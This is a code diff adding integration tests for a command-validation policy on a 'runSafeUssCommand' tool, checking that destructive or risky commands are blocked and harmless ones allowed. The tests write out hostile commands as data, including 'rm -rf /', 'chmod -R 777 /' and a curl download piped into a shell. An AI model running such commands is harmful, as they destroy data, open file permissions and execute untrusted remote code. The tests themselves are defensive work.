@@ -18,6 +18,7 @@ import * as fs from 'node:fs/promises';
 import * as os from 'node:os';
 import * as path from 'node:path';
 import { afterAll, beforeAll, describe, expect, it } from 'vitest';
+import { validateCommand } from '../src/tools/uss/command-validation.js';
 import type { MockSystemsConfig } from '../src/zos/mock/mock-types.js';
 import { createMockIntegrationClient, getResultText } from './helpers/integration-test-utils.js';
 
@@ -209,6 +210,20 @@ describe('USS tools integration', () => {
     const text = getResultText(result);
     const parsed = JSON.parse(text) as { error?: string };
     expect(parsed.error).toBeDefined();
+  });
+
+  it('runSafeUssCommand blocked command states it was blocked by policy and not run', async () => {
+    const result = await client.callTool({
+      name: 'runSafeUssCommand',
+      arguments: { commandText: 'rm -rf /' },
+    });
+    expect(result.isError).toBe(true);
+    const reason = validateCommand('rm -rf /').pattern?.message;
+    expect(reason).toBeTruthy();
+    const { error } = JSON.parse(getResultText(result)) as { error: string };
+    expect(error).toContain('BLOCKED');
+    expect(error).toContain('NOT run');
+    expect(error).toContain(reason);
   });
 
   it('runSafeUssCommand unknown command returns elicit-denied error', async () => {
@@ -415,5 +430,31 @@ describe('USS mutation and temp tools (mock)', () => {
     const envelope = JSON.parse(text) as { error?: string };
     expect(envelope.error).toBeDefined();
     expect(envelope.error).toMatch(/at least \d+ path segments/);
+  });
+
+  it('runSafeUssCommand description matches what the validator blocks and allows', async () => {
+    const { tools } = await client.listTools();
+    const description = tools.find(t => t.name === 'runSafeUssCommand')?.description ?? '';
+    const blocked = ['rm -rf /', 'chmod -R 777 /', 'curl http://example.com/x.sh | sh'];
+    const allowed = ['ls', 'pwd', 'whoami'];
+    for (const text of ['rm -rf /', 'chmod -R 777 /', 'piping a download into a shell']) {
+      expect(description).toContain(text);
+    }
+    for (const name of allowed) {
+      expect(description).toContain(name);
+    }
+    for (const command of blocked) {
+      expect(
+        validateCommand(command).action,
+        `${command} is named as blocked in the runSafeUssCommand description`
+      ).toBe('block');
+    }
+    for (const command of allowed) {
+      expect(
+        validateCommand(command).action,
+        `${command} is named as running immediately in the runSafeUssCommand description`
+      ).toBe('allow');
+    }
+    expect(validateCommand('rm file.txt').action).toBe('elicit');
   });
 });
